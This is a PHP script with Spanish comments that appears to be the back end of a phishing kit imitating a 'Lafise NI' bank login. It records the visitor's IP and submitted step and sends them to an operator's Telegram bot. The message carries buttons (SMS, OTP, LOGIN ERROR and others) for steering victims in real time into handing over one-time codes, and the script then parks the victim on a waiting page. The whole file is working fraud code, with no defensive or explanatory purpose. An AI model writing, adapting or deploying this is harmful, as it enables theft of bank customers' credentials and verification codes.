<?php
session_start();

// Crear usuario si no existe en sesión
if (!isset($_SESSION['usuario'])) {
    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999);
}

$usuario = $_SESSION['usuario'];
$tipo = $_POST['tipo'] ?? 'no especificado';

// Obtener IP
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

require_once("settings.php");

// NUEVOS BOTONES válidos
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "TOKEN|$usuario"],
            ["text" => "❌ SMS ERROR", "callback_data" => "TOKEN-ERROR|$usuario"]
        ],
        [
            ["text" => "📩 OTP", "callback_data" => "OTP|$usuario"],
            ["text" => "❌ OTP ERROR", "callback_data" => "OTP-ERROR|$usuario"]
        ],
        [
            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$usuario"]
        ]
    ]
];

// Enviar mensaje a Telegram
$mensaje = "LOGIN Lafise NI\n ✅ : $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir al cliente
header("Location: sleep.html");
exit;
